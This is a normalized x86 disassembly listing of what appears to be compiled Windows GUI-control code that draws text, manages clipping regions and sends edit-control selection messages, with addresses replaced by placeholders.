je r-xdata
adc eax 0x0
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
call sub_449db8
push eax
push esi
call DrawTextW
sub ebx 0x4
mov ebx [ ebx ]
mov [ ebp - 0x1d ] 0x1c
mov [ ebp - 0x1d ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x7c ]
lea eax [ ebp - 0x78 ]
call sub_449f90
mov eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_46e8c8
push eax
call sub_44c2c8
lea ecx [ ebp - 0x64 ]
pop edx
call sub_44c608
jmp r-xdata
call sub_44c2c8
lea ecx [ ebp - 0x64 ]
movzx edx [ ebp - 0x1d ]
call sub_44c678
lea eax [ ebp - 0x58 ]
push eax
mov eax edi
call sub_46e8c8
push eax
call sub_44c2c8
lea ecx [ ebp - 0x64 ]
pop edx
call sub_44c490
push 0x0
mov eax edi
call sub_46e8c8
push eax
call SelectClipRgn
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_48df68
cmp [ ebp - 0x74 ] 0x0
je r-xdata
sub_4594e4
xor ecx ecx
xor edx edx
xor eax eax
call sub_422fe4
lea edx [ ebp - 0x58 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x44 ]
sar eax 0x1
jns r-xdata
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x48 ]
push eax
mov eax edi
call sub_46e8c8
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
adc eax 0x0
mov [ ebp - 0x1d ] 0x1c
mov [ ebp - 0x1d ] 0x1b
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4597e9
lea eax [ ebp - 0x9c ]
mov edx 0x3
call j_sub_44936c
lea eax [ ebp - 0x80 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x78 ]
call sub_4499d8
lea eax [ ebp - 0x74 ]
call j_sub_449348
lea eax [ ebp - 0x6c ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_44936c
retn
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x7c ]
lea eax [ ebp - 0x78 ]
call sub_449f90
mov eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_46e8c8
push eax
call sub_44c2c8
lea ecx [ ebp - 0x64 ]
pop edx
call sub_44c608
jmp r-xdata
call sub_44c2c8
lea ecx [ ebp - 0x64 ]
movzx edx [ ebp - 0x1d ]
call sub_44c678
lea eax [ ebp - 0x58 ]
push eax
mov eax edi
call sub_46e8c8
push eax
call sub_44c2c8
lea ecx [ ebp - 0x64 ]
pop edx
call sub_44c490
push 0x0
mov eax edi
call sub_46e8c8
push eax
call SelectClipRgn
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_48df68
cmp [ ebp - 0x74 ] 0x0
je r-xdata
sub_4597f7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_459872
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x4 ]
movzx eax [ edi + 0x4 ]
call sub_476f74
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_495c00
mov eax ebx
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax ebx
call sub_496eb0
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459879
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4598d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_497f50
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_48d5f8
mov edx 0x11
mov eax esi
call sub_48d62c
mov [ esi + 0x1ad ] 0x1
mov [ esi + 0x1b4 ] esi
mov [ esi + 0x1b0 ] sub_459ab0
mov [ esi + 0x1be ] 0x1
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
mov [ esi + 0x1b4 ] esi
mov [ esi + 0x1b0 ] sub_4599a8
jmp r-xdata
sub_4599a8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_459aa0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x48 ]
xor ecx ecx
mov edx 0x40
call sub_447ae4
mov [ ebp - 0x48 ] 0x40
mov [ ebp - 0x44 ] 0x2801
mov eax [ ebp + 0x8 ]
and eax 0x400
cmp eax 0x400
jne r-xdata
mov eax [ ebx + 0x1a0 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
mov [ ebp - 0x40 ] eax
mov eax [ ebx + 0x1b8 ]
mov [ ebp - 0x14 ] eax
call sub_44c2c8
lea ecx [ ebp - 0x54 ]
mov dl 0x2
call sub_44c6fc
call sub_44c2c8
mov dl 0x3
call sub_44c394
mov esi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
or [ ebp - 0x44 ] 0x200
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41d610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459aa7
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_459ab0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_459b27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push esi
call DrawTextW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459b2e
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_459b38
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_459e42
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test esi 0x400
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459e49
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
cmp [ ebx + 0x1be ] 0x0
jne r-xdata
cmp [ ebx + 0x1be ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_490a7c
mov esi eax
mov edx [ ebx + 0x64 ]
mov eax [ ebx + 0x1a0 ]
call sub_46e7e4
cmp [ ebx + 0x1c0 ] 0x0
je r-xdata
or esi 0x800
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
cmp [ ebx + 0x1ad ] 0x0
jne r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax ] 0x26
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44a068
mov eax [ ebp - 0xc ]
push eax
push esi
mov eax [ ebx + 0x1a0 ]
call sub_46e8c8
mov edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call OffsetRect
mov eax [ ebx + 0x1a0 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_46d5ac
mov eax [ ebp - 0xc ]
push eax
push esi
mov eax [ ebx + 0x1a0 ]
call sub_46e8c8
mov edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0xc ]
push eax
call OffsetRect
mov eax [ ebx + 0x1a0 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_46d5ac
mov eax [ ebp - 0xc ]
push eax
push esi
mov eax [ ebx + 0x1a0 ]
call sub_46e8c8
mov edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_449d80
and esi 0xffffffbf
movzx eax [ ebx + 0x1c0 ]
or esi [ eax * 4 + rw-data ]
cmp [ ebx + 0x1bd ] 0x0
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx eax [ ebx + 0x1c0 ]
add al 0xfe
sub al 0x2
jae r-xdata
dec eax
sete al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_449d80
mov eax [ ebp - 0xc ]
push esi
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx r-xdata
mov eax [ ebx + 0x1a0 ]
call sub_46e724
sub [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
or eax 0x400
push eax
mov eax [ ebx + 0x1a0 ]
call sub_46e8c8
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
mov edi [ ebp - 0x10 ]
sub edi [ ebp - 0x18 ]
mov eax ebx
call sub_48d8bc
cmp edi eax
jle r-xdata
mov eax [ ebx + 0x1a0 ]
mov eax [ eax + 0xc ]
call sub_46d830
cmp edi eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_435d98
mov edi eax
test edi edi
jne r-xdata
dec edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43a904
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44a368
lea eax [ ebp - 0x8 ]
push eax
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
pop eax
call sub_44a0e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
dec edi
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
jmp r-xdata
mov edi eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_459e88
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_46e8c8
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_41d6cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459f03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x14 ]
call sub_46df70
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call FillRect
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_41d7e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f0a
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_41d76c
retn
sub_459f14
push ebx
push esi
push edi
add esp 0xffffffe0
mov ebx eax
mov esi [ ebx + 0x1a0 ]
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
call sub_45a1a8
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_46e058
movzx eax [ ebx + 0x1bd ]
movzx edi [ eax * 2 + rw-data ]
or di 0x40
movzx eax [ ebx + 0x1ac ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x1bc ] 0x0
je r-xdata
mov edx [ ebx + 0x6c ]
mov eax [ esi + 0x14 ]
call sub_46df1c
xor edx edx
mov eax [ esi + 0x14 ]
call sub_46e058
test [ ebx + 0x55 ] 0x80
jne r-xdata
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc5
call sub_4483f8
add esp 0x20
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc5
call sub_4483f8
cmp [ ebx + 0x1bc ] 0x2
jne r-xdata
mov edx esp
mov eax [ ebx + 0x1a0 ]
call sub_459e88
mov edx esp
mov eax esi
call sub_46e300
jmp r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_45a034
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ad ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45a0e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
mov edx [ ebp - 0x8 ]
call sub_46e950
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1bd ]
movzx ecx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffc5
call sub_4483f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
xor edx edx
call sub_46e950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a0e9
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_45a0e9
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1ac ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4483f8
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
lea eax [ ebp - 0x9 ]
call sub_48a5b4
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax [ ebp - 0x14 ]
add ebx eax
sub_45a1f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45a1a8
cmp bl al
je r-xdata
mov [ esi + 0x1bf ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45a258
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x1bd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x1bd ] dl
mov eax ebx
mov si 0xffc6
call sub_4483f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45a284
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_48d1f8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x1a8 ]
jne r-xdata
xor eax eax
mov [ edi + 0x1a8 ] eax
sub_45a2e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45a382
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a389
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
cmp [ ebx + 0x1be ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
call sub_476f74
test al al
je r-xdata
mov edi [ ebx + 0x1a8 ]
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
sub_45a390
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_490f20
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_48d5f8
mov edx 0x19
mov eax esi
call sub_48d62c
mov dl 0x1
mov eax esi
call sub_496b44
xor edx edx
mov eax esi
call sub_48e174
mov [ esi + 0x268 ] 0x1
mov [ esi + 0x260 ] 0x0
mov [ esi + 0x26d ] 0x1
mov [ esi + 0x26e ] 0x1
mov [ esi + 0x26f ] 0x1
mov eax esi
call sub_45ac54
mov [ esi + 0x280 ] 0xffffffff
mov [ esi + 0x284 ] 0xffffffff
mov [ esi + 0x288 ] 0x0
lea eax [ esi + 0x28c ]
xor edx edx
call sub_449d2c
mov [ esi + 0x274 ] 0x0
mov eax esi
test bl bl
je r-xdata
sub_45a46c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop esi
pop ebx
retn
sub_45a48c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
je r-xdata
pop esi
pop ebx
retn
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
push esi
mov eax ebx
call sub_496868
xor ecx ecx
mov edx 0x1501
call sub_41f080
sub_45a538
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28c ]
mov edx esi
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x28c ]
mov edx esi
call sub_449d2c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov edx [ ebx + 0x28c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_45a588
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x264 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x264 ] esi
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
sub_45a5cc
push ebx
push esi
mov esi eax
movzx ebx [ esi + 0x273 ]
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_496868
push eax
call SendMessageW
test eax eax
setne bl
sub_45a604
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_496c14
test al al
je r-xdata
mov [ esi + 0x273 ] bl
pop esi
pop ebx
retn
push 0x0
movzx eax bl
push eax
push 0xb9
mov eax esi
call sub_496868
push eax
call SendMessageW
pop esi
pop ebx
retn
sub_45a63c
push ebx
mov ebx eax
cmp dl [ ebx + 0x288 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x288 ] dl
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp [ ebx + 0x288 ] 0x0
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
and eax 0xffffdfff
push eax
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
or eax 0x2000
push eax
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
jmp r-xdata
sub_45a6b0
push ebx
mov ebx eax
cmp dx [ ebx + 0x26a ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x26a ] dx
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_492ec4
sub_45a6d8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x26c ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x26c ] bl
mov eax esi
call sub_496c14
test al al
je r-xdata
push 0x0
movzx eax bl
push eax
push 0xcf
mov eax esi
call sub_496868
push eax
call SendMessageW
sub_45a714
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax [ esp ]
pop edx
pop ebx
retn
sub_45a738
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop esi
pop ebx
retn
sub_45a758
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_45a788
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_496868
push eax
call SendMessageW
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_496868
push eax
call SendMessageW
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ecx
pop edx
pop esi
pop ebx
retn
sub_45a820
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
mov ebx eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xe4 ]
mov [ ebp - 0x8 ] eax
mov eax esi
call sub_48df00
inc eax
call sub_436404
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a8ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43640c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_48df10
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx ebx
add edx edx
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_436110
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a8b3
mov eax [ ebp - 0xc ]
call sub_436444
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_45a8c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
mov [ ebp - 0x8 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xe4 ]
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_449e68
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax esi
call sub_48df00
inc eax
call sub_436404
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a951
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43640c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_48df10
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx ebx
add ecx ecx
mov edx [ edi ]
call sub_4476cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436444
retn
sub_45a960
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4926c0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4925ec
mov eax ebx
mov si 0xffc7
call sub_4483f8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x260 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0xc0
or eax edx
movzx edx [ ebx + 0x268 ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x26a ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x288 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x26c ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x271 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x26f ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x270 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
cmp [ ebx + 0x268 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_45aa45
add [ eax ] al
add [ ebp ] al
inc esp
add [ ecx ] cl
push esp
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff34
mov ebx eax
